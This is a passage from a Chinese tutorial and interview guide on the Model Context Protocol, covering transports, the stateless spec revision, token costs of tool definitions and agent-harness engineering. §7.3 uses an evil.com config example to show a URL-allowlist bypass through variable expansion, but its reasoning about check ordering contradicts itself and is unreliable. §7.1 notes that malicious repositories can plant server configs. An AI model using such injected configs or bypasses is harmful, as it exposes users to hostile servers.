Client ──POST /mcp──────→ Server    # 所有请求都走这一个端点
Client ←─── 响应 ────────  Server    # 两种可能：
                                    #  (a) 普通 JSON（简单场景）
                                    #  (b) text/event-stream（需要流式时）
```

**「渐进式复杂度」是它最漂亮的设计**：

| Server 档位 | 要实现什么 | 复杂度 |
| --- | --- | --- |
| 最简 | 只处理 POST，返回 JSON | **和写一个普通 REST 接口一样** |
| 中级 | POST 返回 SSE 流，支持流式响应 | 加一个流式响应 |
| 高级 | 加上服务端主动推送通知 | 加一条长连接 |

这个分档意味着**入门门槛极低**：你想暴露一个内部 API 成 MCP Server，
写个处理 POST 的 handler 就够了，不需要碰 SSE。

### 4.3 ⚠️ 这里有一处两代差异，必须分清

📄 **≤2025-11-25 的 Streamable HTTP**（大多数教程教的）：

- 用 `Mcp-Session-Id` 头管会话，Client 用 DELETE 显式终止
- 用 `GET /mcp` 建立 SSE 长连接接收服务端推送
- 用 SSE 的 `Last-Event-ID` 做断线重连和消息补发

🌐 **2026-07-28 的 Streamable HTTP**：上面三条**全被删掉**，换成：

- **无会话**。要跨调用保持状态，用**服务端签发的 handle 当普通工具参数传**
- `GET` 端点和 `resources/subscribe` 统一到 **`subscriptions/listen`**：
  一条长活的 POST 响应流，Client 显式订阅想要的通知类型
- **无断点续传**。流断了就是丢了，**Client 必须用新的 request id 整个重发**
- 新增必需头 `Mcp-Method` / `Mcp-Name`，让 HTTP 中间层能在不解 body 的前提下路由

**「无断点续传」这条的工程后果要想清楚**：一个跑了 30 秒的工具调用，
流断在第 29 秒，你只能从头重来。所以：

> 🔬 **工具的幂等性设计变得比以前重要得多。**
> 一个「创建 issue」的工具如果不幂等，重发就会创建两个 issue。
> 这个代价以前由协议层的消息补发吸收，现在被推给了工具作者。

### 4.4 两种传输的完整选型对照

| 维度 | stdio | Streamable HTTP |
| --- | --- | --- |
| 部署位置 | 本地同机 | 跨网络 |
| 连接模型 | 1:1（单 Client） | 1:N（多 Client 共享） |
| 性能 | 最优（微秒级，无网络） | 有 HTTP 开销 |
| 认证 | 不需要（继承用户权限） | **必须**（OAuth 2.1） |
| 会话 | 进程生命周期即会话 | 无（2026-07-28 起） |
| 断线恢复 | 进程崩了要重启 | 无（要整个重发） |
| **可治理性** | ❌ **没有拦截点** | ✅ 可集中认证/审计/限流 |
| 适用 | CLI、IDE 插件、本地开发、敏感数据不出本机 | SaaS 集成、企业内网、云端部署 |

### 4.5 选型的真正判据：不是「本地 vs 远程」

📄 直觉判据是「Server 在哪就用哪种」，但真正的判据是两个变量：

**变量一：用户数量。** 单用户 → stdio；多用户共享 → HTTP。

**变量二（更硬）：合规要求。** 这一条会**推翻**变量一：

> **即使是单用户场景，如果企业安全策略要求所有工具调用可审计，
> 也必须走远程传输——因为 stdio 没有拦截点。**

这就是那条核心 trade-off：

> ⚖️ **本地性能 vs 远程治理。**
> 本地进程通信天然快但**不可治理**（没地方插审计）；
> 远程 HTTP 天然可治理但有网络开销。这两者在工程上是对偶的。

📄 **生产里最常见的是混合模式**：本地 stdio 处理文件系统 / Git 这类敏感本地工具，
远程 Streamable HTTP 处理 SaaS 集成。
还有一个中间方案：**把远程 Server 的代码部署在本机**
（本机运行但通过 HTTP 通信），兼顾数据不出机和可审计。

🎤 **面试话术**：「传输选型表面看是本地还是远程，实际上是性能和治理的权衡。
stdio 快但没有拦截点，这在企业环境是致命的——安全团队要审计每次工具调用，
而 stdio 的调用发生在用户机器上的两个进程之间，你根本插不进去。
所以我见到的生产模式基本都是混合的：敏感本地工具走 stdio，
需要审计的走 HTTP 经 Gateway。」

### 4.6 🔬 一个真实实现里的传输类型清单

看真实 harness 支持多少种传输，能感受到「协议之上还有多少工程」。
sid-code 的类型定义（`packages/core/src/mcp/types.ts:135`，2026-08-31 实读）：

```ts
transport: "stdio" | "http" | "http-json" | "sse" | "ws";
```

📄 Claude Code 支持得更多，除上述还包括**进程内传输**（InProcessTransport）
—— 不 spawn 子进程，Server 直接在宿主进程内跑。
它的理由很具体：Chrome MCP Server 如果独立进程要加载完整 Node 运行时
（约 325MB），进程内直接复用宿主运行时。

🔬 这里有个很精巧的实现细节值得学：进程内传输的 `send()` 用
`queueMicrotask` 异步投递，**不能同步调用对面的 `onmessage`**。
因为在请求/响应模式下同步调用会让栈无限增长
（A.send → B.onmessage → B.send → A.onmessage → …），异步投递切断这条同步链。

**这件事说明一个重要的架构性质**：
**传输层是可替换的，所以「进程内运行」不违反 MCP 的进程隔离哲学**——
接口不变，实现可变。这是分层解耦的红利。

### 4.7 本章自检

1. stdio 传输里，一条消息的分隔符是什么？和 SSE 的区别是什么？
2. 单用户场景，什么条件下仍然必须用远程传输而不能用 stdio？
3. `2026-07-28` 删掉断点续传后，工具设计上要额外注意什么？为什么？
4. 「进程内传输」违反了 MCP 的进程隔离设计吗？为什么？

---
<a id="c5"></a>
## §5 ★ 无状态化转向：2026-07-28 到底删了什么，为什么

这一章讲 MCP 至今最大的一次转向。**它值得单独一章，因为它是理解「协议演进方向」
的唯一入口**——而演进方向是面试里最能体现深度的部分。

### 5.1 先看删掉了什么（🌐 官方 changelog，2026-08-31 核验）

`2026-07-28` 相对 `2025-11-25` 的九条重大变更，按「删」和「加」分组：

**删掉的（这是主线）**：

| # | 删掉了什么 | 替代方案 |
| --- | --- | --- |
| 1 | 协议级**会话**与 `Mcp-Session-Id` 头 | 要跨调用状态 → **服务端签发 handle，当普通工具参数传** |
| 2 | `initialize` / `notifications/initialized` **握手** | 每请求在 `_meta` 自带版本与能力 |
| 3 | `ping`、`logging/setLevel`、`notifications/roots/list_changed` | 日志级别改为每请求带 `io.modelcontextprotocol/logLevel` |
| 4 | HTTP GET 端点 + `resources/subscribe`/`unsubscribe` | 统一为 **`subscriptions/listen`** 单一长活 POST 流 |
| 5 | SSE **断点续传**（`Last-Event-ID` + 事件 ID） | 无。流断了用**新 request id** 整个重发 |

**加进来的**：

| # | 加了什么 | 作用 |
| --- | --- | --- |
| 6 | **`server/discover`**（**必须**实现的 RPC） | 一次拿到「支持的版本 + 能力 + 身份」，也可当 stdio 上的兼容性探针 |
| 7 | **MRTR**（Multi Round-Trip Requests）模式 | 取代服务端主动发起请求（`roots/list`、`sampling/createMessage`、`elicitation/create`） |
| 8 | 所有结果必带 `resultType` 字段 | `"complete"` 或 `"input_required"`。**旧版 Server 省略此字段时，Client 必须当作 `"complete"`** |
| 9 | Tasks 移出核心，成为官方扩展 | `io.modelcontextprotocol/tasks`，改为 `tasks/get` 轮询 |

**次要但工程上很重要的几条**：

- `extensions` 字段进入 `ClientCapabilities` / `ServerCapabilities`
- 📄 **`tools/list` 应返回确定性顺序**——明确写着是为了
  「让客户端能缓存，并提高 LLM 的 prompt cache 命中率」（§6.5 会讲这条为什么关键）
- 新增 `CacheableResult`：`tools/list` 等结果**必须**带 `ttlMs` 和 `cacheScope`
- 必需请求头 `Mcp-Method` / `Mcp-Name`（让 HTTP 中间层不解 body 就能路由）
- OTel trace 上下文传播约定（`traceparent` / `tracestate` / `baggage` 进 `_meta`）

**被标记为 Deprecated（还在但要移除）**：Roots、Sampling、Logging 三个特性；
HTTP+SSE 传输；OAuth 动态客户端注册（RFC 7591）改推 Client ID Metadata Documents。

### 5.2 为什么要这么改：一条主线贯穿所有删除

把上面五条删除放在一起看，**它们全都在删同一样东西：跨请求的状态**。

原因非常工程化：

> **有状态 + 长连接的协议，没法被普通 HTTP 基础设施承载。**

具体到会出什么问题：

| 有状态带来的麻烦 | 具体表现 |
| --- | --- |
| **负载均衡** | 有 Session ID 就必须做会话亲和（sticky session），否则第二个请求打到另一台机器上，会话找不到 |
| **水平扩容** | 会话状态在进程内存里 → 不能随便加减实例，重启就丢会话 |
| **CDN / 反向代理** | 长连接被 Nginx 缓冲、被中间层超时掐断，是企业部署的经典噩梦 |
| **无服务器部署** | Lambda / Cloud Run 这类天然无状态的运行时，压根装不下一个有状态会话 |

**删掉状态之后**，一个 MCP Server 就退化成
「**一个处理 POST 的普通 HTTP 服务**」——而这样的服务，
过去二十年的整套基础设施（负载均衡、CDN、网关、WAF、无服务器）**全都直接可用**。

🎤 **面试话术（这段能明显拉开差距）**：
「`2026-07-28` 做了一次很彻底的转向：把协议核心无状态化。
握手、Session ID、ping、SSE 断点续传全删了。
动机很清楚——有状态长连接和现代 HTTP 基础设施是冲突的：
Session ID 强迫你做会话亲和，长连接会被反向代理缓冲和掐断，
而且这样的 Server 没法跑在 Lambda 这种无状态运行时上。
删掉状态之后，MCP Server 就是个普通的 POST 接口，
整套现成的 HTTP 基础设施直接可用。
代价是可靠性从协议层被推到了应用层——比如流断了现在要整个重发，
所以工具的幂等性设计变得更重要。这个取舍我认为是对的，
因为**协议层做的可靠性总是最弱的那一档**，
而基础设施层已经把这件事做得很好了。」

### 5.3 一个反直觉的观察：这次改动其实是「向 HTTP 学习」

📄 值得注意的是，`2026-07-28` 的路线图里明确写了
**「不再增加新的官方传输方式」**——刻意保持传输层简洁，
新能力一律通过 **Extension 机制**推进（`io.modelcontextprotocol/xxx` 反向 DNS 命名，
按请求协商，客户端声明支持哪些，服务端只用客户端要过的）。

这个「**瘦核心 + 可选扩展**」的架构和 HTTP 的演进路径完全一致：

```
HTTP/1.1 核心协议 20 年没大改
    └─ 通过 WebSocket / HTTP/2 / HTTP/3 / 各种 header 扩展持续演进

MCP 核心协议趋于稳定（且这次还在往回删）
    └─ 通过 Extensions 演进：MCP Apps（UI）/ Tasks（长任务）
       / OAuth Client Credentials（机器对机器）/ 企业托管授权
```

⚖️ **这背后是一条核心 trade-off**：**协议简洁性 vs 功能完备性**。
协议越简单越容易被广泛采用（110M+ 月 SDK 下载量证明了这一点），
但生产场景总需要更多能力。**Extension 机制是这个矛盾的解**——
核心稳定，能力可选，不支持某扩展的宿主自动退化到基础行为。

### 5.4 MRTR：一个值得单独理解的新模式

第 7 条变更（MRTR）比较绕，但它是个很漂亮的设计，值得讲清。

**问题**：有时候 Server 处理请求时**需要问 Client 一些事**。
比如「我要执行这个操作，但需要用户先授权」，或者
「我需要知道你的工作目录在哪」。

**≤2025-11-25 的做法：服务端主动发起请求。**
Server 反过来给 Client 发一条 Request（`elicitation/create`、`roots/list`、
`sampling/createMessage`）。这要求**连接是双向的、有状态的**
——正是 §5.2 要删掉的东西。

**2026-07-28 的 MRTR 做法**：把「反问」变成一种**返回值**。

```
① Client → Server: tools/call（我要执行这个工具）
② Server → Client: 返回 InputRequiredResult
                    { resultType: "input_required",
                      inputRequests: [ …我需要这些信息… ] }
③ Client 收集到信息后，【重发原请求】，带上 inputResponses
④ Server → Client: { resultType: "complete", … } 正常结果
```

**为什么这个设计更好**：

- 全程都是「Client 发请求，Server 回响应」，**方向永远单一**
- 不需要长连接，不需要会话——**每次都是一个完整的请求-响应**
- 因此可以经过任何 HTTP 中间层

这也解释了为什么 `resultType` 要变成**必填**字段：
Client 每次收到结果都必须先判断「这是最终结果，还是一次反问」。
📄 并且规范明确要求：**旧版 Server 省略该字段时，Client 必须当作 `"complete"`**
—— 这是向后兼容的关键一条。

### 5.5 两代共存：一个必须面对的现实

**生态迁移不可能一夜完成**，所以你在真实项目里一定会同时遇到两代 Server。
处理策略：

| 情况 | 怎么办 |
| --- | --- |
| Server 支持 `server/discover` | 直接调它拿版本与能力，最干净 |
| Server 不认 `server/discover`（旧版） | 退化到 `initialize` 握手路径 |
| 结果里没有 `resultType` | 📄 规范要求：**当作 `"complete"`** |
| 版本不匹配 | Server 返回 `UnsupportedProtocolVersionError`（`-32022`）并列出支持的版本，换一版重试 |

🔬 **一个真实实现的宽容策略**（sid-code，`packages/core/src/mcp/client.ts:31,212-213`，实读）：

```ts
export const CLIENT_PROTOCOL_VERSION = "2025-03-26";
// …
// G6-5：协议版本协商——比对服务器返回的 protocolVersion，
//        不一致仅 warn，不强制断开（宽容）。
```

**这个「不一致只警告不断开」的选择值得讨论。** 规范讲的是
「版本不兼容应终止」，但实践里宽容更实用——因为**大量 Server 的版本号是乱写的**
（复制粘贴模板时没改），严格校验会拒掉一堆其实能正常工作的 Server。

⚠️ 但要清楚这是在**拿正确性换可用性**：如果 Server 真的说的是不兼容的协议，
宽容策略会让错误延后到某个具体方法调用失败时才暴露，
**排查成本更高**。这是个有意识的取舍，不是疏漏。

### 5.6 本章自检

1. 把 `2026-07-28` 删掉的五样东西归纳成一句话（它们的共同点是什么）。
2. 为什么「有状态会话」会让 Server 没法跑在 Lambda 上？
3. MRTR 相比「服务端主动发起请求」，在架构上买到了什么？
4. 你的 Client 收到一个结果，里面没有 `resultType` 字段。该怎么处理？为什么？
5. 「版本不匹配只警告不断开」这个策略，牺牲了什么换到了什么？

---
<a id="c6"></a>
## §6 ★ 最反直觉的一章：瓶颈在 Token，不在网络

### 6.1 直觉是错的

问一个问题：**MCP 加了一层协议，性能瓶颈在哪？**

几乎所有人的第一反应是「**网络跳转延迟**」——多一层转发，多一次往返。
这个直觉来自后端工程师的本能，在 MCP 上**是错的**。

真实答案：

> **瓶颈在 Token 消耗。工具定义本身就是个 Token 黑洞，
> 它在 agent 做任何事之前就已经把上下文吃掉了。**

📄 一组量级数字（2026 年上半年，引用请带出处与时间）：

| 现象 | 数字 |
| --- | --- |
| 3 个 MCP Server 各 40 个工具 | **100K+ Token** —— 在 agent 干活之前就消耗掉了 |
| 工具元数据占可用上下文的比例 | **40–50%** |
| Cloudflare 的 2,500+ API 端点全暴露为 MCP 工具 | **117 万 Token** —— **超过大多数模型的整个上下文窗口** |
| Microsoft Graph MCP 处理 50 台设备 | ~145K Token（等价 CLI 方案只需 ~4.15K，**差 35 倍**） |

**为什么会有这个认知偏差**：开发者习惯了 API 调用的思维模型——
在那个世界里，网络延迟确实是瓶颈。但 MCP 的瓶颈在 **LLM 侧**：
工具定义要**注入上下文窗口**，而上下文窗口是 agent 最稀缺的资源。

### 6.2 机制：为什么工具定义这么贵

回想 §0.4：MCP Server 报出的工具，要被翻译成模型认的 Function Calling 格式，
**塞进每一次请求**。所以：

```
每一轮对话的请求体 =
    system prompt
  + 【全部工具的定义：name + description + 完整 inputSchema】  ← 这里
  + 对话历史
  + 用户这一轮的输入
```

关键在「**全部**」和「**每一轮**」这两个词：

- **全部**：模型不知道这轮要用哪个工具，所以传统做法是把所有工具都给它
- **每一轮**：agent 循环里每次调模型都要重传一遍

一个工具的定义有多大？看 §2.2 那个 `search_issues`，
带完整 schema 和描述大约 150-200 token。**乘以 120 个工具（3 个 Server × 40 个）
就是 2-2.4 万 token，而这只是「工具目录」，还没开始干活。**

⚠️ 更糟的是它**不只花钱，还降低准确率**。工具太多时：

- 模型要在上百个相似描述里挑一个，选错概率显著上升
- 工具定义挤占了真正有用的上下文（代码、文件内容、对话历史）
- 📄 上下文占用率超过 50-65% 后，模型对中段信息的注意力会下降
  （「lost in the middle」效应）

### 6.3 解法一：Tool Search（按需加载）

**核心思路**：不要全量注入，**按用户请求语义检索出相关的少数工具再注入**。

```
用户请求
   ↓
① 把所有工具的 name + description 做 Embedding，存向量库（离线，一次性）
   ↓
② 根据用户请求检索 Top-K 相关工具（通常 K=5~15）
   ↓
③ 只把这 K 个工具的定义注入上下文
   ↓
④ 模型从这 K 个里选一个调用
```

📄 效果数字：

| 方案 | 效果 |
| --- | --- |
| Claude Code 的 MCP Tool Search | 工具定义从 10K+ Token 降到 ~3K（**约 85% 减少**）；
另一处口径：MCP 工具原占 200K 窗口的 22%，实现后接近零 |
| Anthropic 的 Programmatic Tool Calling | **98.7% 减少**（150K → 2K） |
| Nacos-MCP-Router（阿里） | 在 agent 和 Server 之间加语义路由层，只返回相关工具 |

⚠️ **它的代价必须说清**（否则读者会以为这是免费的）：
Tool Search 本身要多一轮检索，📄 有实测称增加约 50% 的往返次数。
**判据是：Token 成本远大于延迟成本，所以这个交换划得来。**
但如果你的场景只有 8 个工具，Tool Search 是纯粹的过度工程——
它增加延迟、增加一个可能出错的组件，却省不下什么。

### 6.4 解法二：把工具描述写好（最便宜、最被忽视的一招）

📄 这一节的投入产出比最高，因为它**零基础设施成本**。

回到 §2.2 那句话：**模型不看你的代码实现，它选不选这个工具，
100% 取决于那段 `description`。**

**三种常见写法错误**：

| 错误 | 例子 | 后果 |
| --- | --- | --- |
| 描述太模糊 | `"description": "Do stuff"` | 模型不知道什么时候该用它 |
| 描述有歧义 | 两个工具描述高度相似 | 模型经常选错那一个 |
| 参数没说明 | `"query": {"type": "string"}` 没有 description | 模型不知道该传什么格式 |

**正确写法的四条**：

1. **描述要包含三件事**：做什么 / **什么时候用** / **不适合什么场景**。
   第二三条最常被漏掉，而它们恰恰是「选择」所需的信息。
2. **参数要有 description 和例子**：`"repo": {"type":"string","description":"owner/repo 格式，如 anthropics/claude-code"}`
3. **用 `annotations` 标注行为特征**：只读 / 破坏性 / 幂等
4. **定期用真实请求测工具选择准确率，迭代描述**——这是唯一能验证的方式

🎤 **面试话术**：「工具描述是 LLM 选择工具的唯一依据，它的质量直接决定选择准确率。
我见过的最常见问题不是描述太短，是**只写了『做什么』没写『什么时候用』**——
模型缺的信息恰恰是后者。而且这件事必须可度量：
用真实请求集测选择准确率，低于 90% 通常说明工具太多或描述有歧义，
而不是模型不行。」

### 6.5 解法三：稳定顺序（一个几乎没人提但很关键的点）

🌐 `2026-07-28` 规范里有一条很容易被跳过的次要变更：

> **Server 应当以确定性顺序返回 `tools/list` 的结果**，
> 以便客户端缓存，并**提高 LLM 的 prompt cache 命中率**。

**为什么这条重要**：prompt cache 是**前缀匹配**的。
如果工具定义在请求体里的顺序每次都变，那么从第一个变动的工具开始，
**后面全部内容的缓存都失效了**。

```
第 1 轮：[system] [工具 A][工具 B][工具 C] [历史]
                                              ↑ 缓存到这里
第 2 轮：[system] [工具 B][工具 A][工具 C] [历史]
                   ↑ 从这里开始就不匹配了 → 后面全部重新计费
```

🔬 一个 agent 里工具顺序不稳定的常见来源：
**从 `Map` 或对象遍历工具、多 Server 并发返回后按完成顺序拼接**。
后者尤其阴——**它的顺序取决于哪个 Server 先响应，每次都可能不同**，
而这不会报任何错，只是缓存命中率悄悄变低。

**修法**：拼接前按稳定键（Server 名 + 工具名）排序。一行代码，
但📄 缓存命中率的差别可以是从个位数到 70%+。

### 6.6 ★ 一个真正反直觉的结论：MCP 的竞争对手不是 A2A，是 CLI

📄 媒体叙事总把 Google 的 A2A 协议说成 MCP 的竞争对手。**这个框架是错的**：

- **A2A 解决 Agent-to-Agent 通信**，MCP 解决 **Agent-to-Tool** 通信。
  两者是**互补的**，不是竞争的。
- **MCP 真正的竞争对手是 CLI 和 Code Mode**。

证据：

| 案例 | 数字 |
| --- | --- |
| Composio 的对比 | CLI 方案比 MCP **减少 50% 上下文消耗** |
| mcp2cli 项目（把 MCP 工具 schema 转成 CLI 命令） | 声称每月节省约 $21,000 |
| Cloudflare | 因为端点太多（2,500+）**无法用 MCP**，转而用 Code Mode |
| Microsoft Graph 那组对比 | MCP ~145K vs CLI ~4.15K Token（**35 倍**） |

**为什么 CLI 更省**：因为**模型已经知道怎么用命令行了**。
你不需要把 `ls` 的完整 JSON Schema 注入上下文——
模型的训练数据里有几百万个 shell 命令的例子。
而「写代码调 API」比「按 schema 填参数」表达力更强：
一行 `for` 循环能顶 50 次工具调用（这正是那 35 倍差距的来源：
50 台设备 = 50 次 MCP 工具调用往返，vs 一条命令）。

🎤 **面试话术**：「很多人把 A2A 当成 MCP 的竞争对手，但它们解决不同问题、是互补的。
MCP 真正的挑战来自 CLI 和 Code Mode——当工具数量到几百个时，
让 agent 写代码调 API 比通过 MCP 工具逐个调用，Token 效率能差 35 倍。
原因有两层：一是模型本来就熟悉 shell 和代码，不需要注入 schema；
二是代码有循环和组合能力，一行循环顶 50 次工具往返。
所以我的判断是 MCP 在『中等数量、需要治理的工具』这个区间最强，
工具特别少时 Function Calling 够用，特别多时 Code Mode 更合适。」

### 6.7 ★ 但要点破一件事：Context Bloat 是客户端问题，不是协议问题

📄 这是本章最重要的一条纠偏，也是很好的面试信号。

MCP 联合创始人 David Soria Parra 在 2026 MCP Dev Summit 上明确说过：

> **「问题不是协议，是客户端天真地把所有工具一次性塞进上下文。」**

证据是**协议层早就提供了工具**：

- `tools/list` 支持**分页**
- Server 可以**动态增删**工具（`notifications/tools/list_changed`）
- 🌐 `2026-07-28` 进一步加了 `CacheableResult`（`ttlMs` + `cacheScope`）
  和「确定性顺序」的要求，都是为客户端缓存服务的

**膨胀是 Host 实现的问题**。Claude Code 实现 Tool Search 前，
MCP 工具吃掉 200K 窗口的 22%；实现后接近零——**协议一个字没改**。

**这条对你的实践意味着什么**：如果你的 agent 因为 MCP 工具太多而变贵变笨，
**该改的是你的接入层，不是换协议**。§7 讲接入层该做哪些事。

### 6.8 这一章的成本账该怎么算（可复算口径）

给一组能自己复算的口径，别只记结论：

| 指标 | 怎么算 | 判据 |
| --- | --- | --- |
| **工具定义占比** | 工具定义 token ÷ 上下文窗口 | > 20% 该上 Tool Search |
| **工具数量** | 全部 Server 的工具总数 | < 15 用 FC 够；> 50 必须做语义路由 |
| **工具选择准确率** | 选对工具的次数 ÷ 总调用次数 | **< 90% 说明工具太多或描述有歧义** |
| **cache 命中率** | cache_read ÷ 总 input token | 顺序不稳定是最常见的杀手（§6.5） |

⚠️ **分母比分子重要**：「工具选择准确率」的分母是
「本该调工具的轮次」还是「所有轮次」，差别巨大——
把不需要调工具的轮次算进分母，准确率会被系统性拉高，
于是一个有问题的工具集看起来很健康。**口径必须和指标一起写死。**

### 6.9 本章自检

1. MCP 的性能瓶颈在哪？为什么大多数人的第一反应是错的？
2. 工具定义为什么这么贵？点出「全部」和「每一轮」各自的含义。
3. 你的 agent 有 8 个工具，该不该上 Tool Search？为什么？
4. 为什么工具的返回顺序不稳定会伤 prompt cache？它会报错吗？
5. 「MCP 导致上下文膨胀」这句话错在哪？协议提供了哪三样工具？
6. 为什么说 MCP 真正的竞争对手是 CLI 而不是 A2A？给出那 35 倍差距的两层原因。

---
<a id="c7"></a>
## §7 从协议到 harness：接进去要做十件事

### 7.0 这一章的定位

前面六章讲的是**协议**。这一章讲**协议之上的工程**——也就是
「我读完了规范，现在要把 MCP 接进我的 agent，具体要写什么代码」。

**这一章是本文密度最高、也最实用的部分**，因为：

> 🔬 **协议本身只占接入工作量的一小部分。**
> sid-code 的 MCP 模块 19 个文件、4682 行（`packages/core/src/mcp/`，
> 2026-08-31 实读，排除测试），其中真正「实现 JSON-RPC 收发」的部分不到四分之一。
> 剩下四分之三全是本章这十件事。

行数口径（可复跑）：

```bash
find packages/core/src/mcp -name '*.ts' -not -name '*.test.ts' | xargs wc -l | tail -1
# → 4682 total（2026-08-31）
```

十件事总览：

| # | 要做的事 | 不做会怎样 |
| --- | --- | --- |
| 1 | 多来源配置合并 | 同一个 Server 连两遍，工具重复 |
| 2 | 签名去重 | 同上，且模型看到两套一样的工具会混淆 |
| 3 | 环境变量展开 | 配置里没法放密钥，只能硬编码 |
| 4 | 连接状态机 | 在没连上的 Server 上调工具 → 崩 |
| 5 | 并发与批量控制 | 10 个 Server 同时 spawn，机器卡死 |
| 6 | 工具名命名空间 | 两个 Server 都有 `search` → 撞名 |
| 7 | annotations 映射 | 权限系统不知道哪个工具危险 |
| 8 | 描述与结果截断 | 一个 Server 60KB 的描述吃掉整个窗口 |
| 9 | instructions 注入（且别毁 cache） | prompt cache 被反复击穿 |
| 10 | 差异化重连 | 本地进程崩了还在无脑重连 |

### 7.1 多来源配置合并

**问题**：MCP Server 配置的来源多到离谱。📄 Claude Code 支持七种：

```
enterprise（企业 MDM 强制）
user（用户全局 ~/.claude.json）
local（项目私有，按路径隔离）
project（.mcp.json，提交进 Git）
dynamic（命令行 --mcp-config / 插件提供）
claudeai（Web 端同步的 connector）
managed（远程托管设置）
```

它们之间会**冲突**（同名 Server）、**重复**（插件和手动配置指向同一个进程）、
**有安全风险**（恶意仓库塞的 `.mcp.json`）。

**解法**：每个配置带一个 `scope` 标记来源，然后分层合并。

📄 `scope` 不只是元数据，**它决定安全策略**：

> **`project` scope 的 Server 需要用户审批**（因为 `.mcp.json` 可能被恶意仓库注入），
> **`user` scope 不需要**（用户自己配的）。

这条区分是整个 MCP 安全模型里最实用的一条，§8.4 展开。

### 7.2 签名去重

**场景**：用户手动配了 Slack MCP Server，又装了个 Slack 插件，插件自带同一个 Server。
两个都连 → **模型看到两套完全相同的工具**，白烧 token 且造成选择混淆。

📄 解法是按**签名**去重：

```ts
function getMcpServerSignature(config): string | null {
  const cmd = getServerCommandArray(config);
  if (cmd) return `stdio:${JSON.stringify(cmd)}`;   // stdio: 按命令+参数
  const url = getServerUrl(config);
  if (url) return `url:${unwrapCcrProxyUrl(url)}`;  // remote: 按 URL
  return null;                                       // 无法去重的类型，保留
}
```

三个设计点：

- **stdio 用 `command + args` 数组**：启动同一个命令就是同一个 Server
- **远程用 URL**，且要处理代理包装（提取原始 vendor URL 再比）
- **去重优先级：手动配置 > 插件 > Web connector**。
  📄 这反映一条原则：**用户的显式意图优先级最高**

### 7.3 环境变量展开（含一个安全顺序坑）

配置里要放密钥，所以支持 `${VAR}` 和 `${VAR:-default}`：

🔬 sid-code 的实现（`packages/core/src/mcp/env-expansion.ts`，59 行）：

```ts
// 展开 ${VAR} / ${VAR:-default}；找不到的变量【保留原文】而不是替换成空串
```

**「找不到就保留原文」这个选择是对的**：替换成空串会让
`"url": "${API_BASE}/mcp"` 变成 `"/mcp"`，然后你去查一个莫名其妙的
相对路径错误；保留原文则会看到 `"${API_BASE}/mcp"`，**一眼知道是变量没设**。

⚠️ **一个必须记住的安全顺序**（📄 Claude Code 的注释点破了这点）：

> **环境变量展开必须发生在策略过滤【之后】。**

因为如果先展开再过滤，恶意配置可以绕过 URL 白名单：

```
配置：{"url": "${EVIL_URL}"}

❌ 先展开再过滤：展开成 https://evil.com → 过滤时看到的是 evil.com…
   等等，这样似乎能拦住？不——问题在反方向：
❌ 先过滤再展开：过滤时看到的是字符串 "${EVIL_URL}"，
   它不匹配任何白名单规则，但也可能因为「看起来不是 URL」而被放过；
   展开后变成真实恶意 URL，已经过了闸。
```

**正确顺序是：过滤用【展开后】的真实值判断，但展开这一步本身要在
拿到最终配置之后、发起连接之前完成。** 一句话记法：
**永远拿「实际会用的那个值」去过闸，不要拿模板过闸。**

### 7.4 连接状态机

**问题**：一个 Server 在生命周期里会经历多种状态，
而**在没连上的 Server 上调工具会崩**。

📄 Claude Code 用五态建模：

```
                    ┌──────────┐
                    │ pending  │ ← 初始 / 重连中
                    └────┬─────┘
                         │ 连接
                    ┌────▼─────┐
               ┌────┤connecting├────┐
          成功 │    └──────────┘    │ 失败
          ┌────▼─────┐    ┌────────▼────────┐
          │connected │    │    failed       │
          └────┬─────┘    └────────┬────────┘
               │ 断开              │ 远程才重连
               └────► pending ◄────┘

          ┌──────────┐         ┌──────────┐
          │needs-auth│         │ disabled │
          └──────────┘         └──────────┘
          (OAuth 失败)          (用户手动禁用)
```

**关键设计：用联合类型让每种状态携带不同数据。**

```ts
type MCPServerConnection =
  | ConnectedMCPServer    // 持有 client 实例、capabilities、instructions
  | FailedMCPServer       // 持有 error
  | NeedsAuthMCPServer    // 等用户完成 OAuth
  | PendingMCPServer      // 持有 reconnectAttempt 进度
  | DisabledMCPServer;
```

**为什么这个建模值得学**：因为它让**类型系统强制你处理每种状态**。
如果只用一个 `{status: string, client?: Client}`，那 `client` 就是可选的，
你在任何地方都可以写 `conn.client!.callTool(...)`——
而这行代码在 `failed` 状态下必然崩。用联合类型，
编译器会要求你先判断 `status === 'connected'` 才能访问 `client`。

🔬 sid-code 的对应实现（`packages/core/src/mcp/manager.ts:66-80`，实读）
用的是单一 `ServerState` 结构 + `status` 字段，
并额外持有 `heartbeatTimer`、`resources`、`prompts`、`instructions`：

```ts
interface ServerState {
  status: MCPConnectionStatus;
  toolCount: number; resourceCount: number; promptCount: number;
  error?: string;
  reconnectAttempts: number;
  heartbeatTimer?: ReturnType<typeof setInterval>;
  resources: MCPResource[]; prompts: MCPPrompt[];
  instructions?: string;
}
```

⚠️ 这是**两种不同取舍**，不是一个好一个坏：联合类型类型安全更强但改起来更重；
单结构 + status 字段更灵活但要靠纪律。**要点是必须有一个显式的状态机**，
而不是散落各处的布尔标志。

### 7.5 并发与批量控制

**问题**：用户配了 15 个 Server，如果全部同时连——
15 个 `spawn` 同时创建子进程，每个都要加载 Node 运行时。**机器会明显卡顿。**

🔬 sid-code 的做法（`packages/core/src/mcp/manager.ts:45-47,285-286`，实读）：

```ts
const LOCAL_BATCH_SIZE = 3;    // 本地 stdio 并发上限
const REMOTE_BATCH_SIZE = 20;  // 远程连接并发上限
// …
await Promise.all([
  pMap(local,  connectOne, LOCAL_BATCH_SIZE),
  pMap(remote, connectOne, REMOTE_BATCH_SIZE),
]);
```

📄 Claude Code 是同样的数字（本地 3 / 远程 20），且可用环境变量覆盖。

**为什么本地和远程差这么多**：
本地每个连接要 `spawn` 一个进程（**重**：内存 + CPU + 文件描述符）；
远程只是一个网络连接（**轻**）。**同一个并发数用在两边必然有一边是错的。**

🔬 另一个值得学的优化（📄 Claude Code）：**状态更新批量化**。
10 个 Server 的连接回调在短时间内密集到达，
如果每个都触发一次 UI 状态更新 → 10 次重渲染。
用一个 16ms 的窗口把它们合并成 1-2 次。

### 7.6 工具名命名空间

**问题**：两个 Server 都暴露了叫 `search` 的工具。撞名了。

**解法**：`mcp__<server>__<tool>` 三段式命名。

🔬 sid-code 的完整实现（`packages/core/src/mcp/normalization.ts`，45 行，全文实读）：

```ts
// API 要求工具名匹配 ^[a-zA-Z0-9_-]{1,64}$
export function normalizeMcpName(name: string): string {
  let normalized = name.replace(/[^a-zA-Z0-9_-]/g, "_");  // 非法字符 → _
